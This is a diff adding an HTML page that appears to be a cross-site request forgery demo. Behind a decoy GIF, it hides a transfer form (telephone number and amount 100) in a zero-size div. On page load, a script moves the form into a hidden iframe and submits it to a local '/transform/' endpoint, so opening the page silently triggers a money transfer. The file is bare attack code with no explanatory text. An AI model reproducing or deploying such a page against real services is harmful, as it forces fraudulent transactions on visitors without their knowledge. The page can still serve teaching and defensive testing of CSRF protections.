@@ -1,0 +1,30 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Title</title>
+    <script src="http://apps.bdimg.com/libs/jquery/2.1.4/jquery.min.js"></script>
+</head>
+<body>
+    <img src="http://ws1.sinaimg.cn/mw690/e0e4ecc3gy1fqormqu2vrg206y0cc7wj.gif" alt="" style="width: 50%;height: 50%">
+    <iframe src="" frameborder="0" style="height: 0;width: 0" id="my_iframe"></iframe>
+    <div id="box" style="width: 0;height: 0">
+        <form action="http://127.0.0.1:8000/transform/" method="post" style="width: 30%" id="my_form">
+              <div class="form-group">
+                <label>Telephone</label>
+                <input type="text" class="form-control" placeholder="电话号码" name="telephone" value="15504975049">
+              </div>
+              <div class="form-group">
+                <label>Count</label>
+                <input type="text" class="form-control" placeholder="转账金额" name="money" value="100">
+              </div>
+        </form>
+    </div>
+    <script>
+        window.onload = function () {
+            $('#my_iframe').contents().find('html').html($('#my_form'));
+            $('#my_iframe').contents().find('html').children('#my_form').submit();
+        }
+    </script>
+</body>
+</html>
